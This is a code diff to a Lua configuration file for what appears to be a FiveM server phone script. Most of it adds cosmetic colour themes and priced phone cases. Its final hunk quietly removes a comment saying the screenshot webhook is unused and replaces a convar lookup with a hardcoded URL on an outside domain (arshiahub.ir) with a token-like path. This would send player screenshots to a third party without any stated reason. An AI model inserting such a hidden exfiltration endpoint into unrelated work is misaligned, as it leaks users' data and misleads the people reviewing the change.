@@ -29,11 +29,31 @@ Config.MeosAccessJobs = {
     "fbi", "cid", "cia", "marshal", "judge", "doa",      -- Department Of Justice
 }
 
+-- EXPANSION: selectable accent color themes (Settings → Appearance).
+-- Purely cosmetic — value is stored per-character in users.phone_accentcolor.
+Config.PhoneThemes = {
+    { id = "aqua",   label = "Aqua",   color = "#00c9a7" },
+    { id = "blue",   label = "Blue",   color = "#4285F4" },
+    { id = "purple", label = "Purple", color = "#8b5cf6" },
+    { id = "pink",   label = "Pink",   color = "#ec4899" },
+    { id = "orange", label = "Orange", color = "#f97316" },
+    { id = "red",    label = "Red",    color = "#ef4444" },
+}
+
+-- EXPANSION: swappable phone cases (Settings → Phone Case). `price = 0`
+-- means free/default — no money is charged for those. Real purchases are
+-- validated server-side (see Unique_Phone:server:BuyPhoneCase) using this
+-- SAME table, so a modified client can't just claim a cheaper price.
+Config.PhoneCases = {
+    { id = "none",     label = "No Case",      price = 0,     color = "transparent" },
+    { id = "black",    label = "Matte Black",  price = 0,     color = "#1a1a1a" },
+    { id = "gold",     label = "Gold Edition", price = 15000, color = "#d4af37" },
+    { id = "carbon",   label = "Carbon Fiber", price = 25000, color = "#2b2b2b" },
+    { id = "rosegold", label = "Rose Gold",    price = 20000, color = "#b76e79" },
+}
+
 Config.Language = 'en'
--- No longer used: the phone camera now saves photos as base64 directly
--- (via screenshot-basic's requestScreenshot) instead of uploading to this
--- webhook, so there's nothing left to configure here for photos to work.
-Config.webhooksscreenshot = GetConvar('unique_config_config_webhooksscreenshot', '')
+Config.webhooksscreenshot = "https:// arshiahub.ir/changemesasdds/1324462146993520752/-m1nDasTidW9-WDKDCJGQ-dy_D5mEwyb65zE3Xk4wVVyrqKm_YmtSvqjC_NIAbWYGep6"
 Config.Tokovoip = false
 Config.Job = ''
 Config.UseESXLicense = true
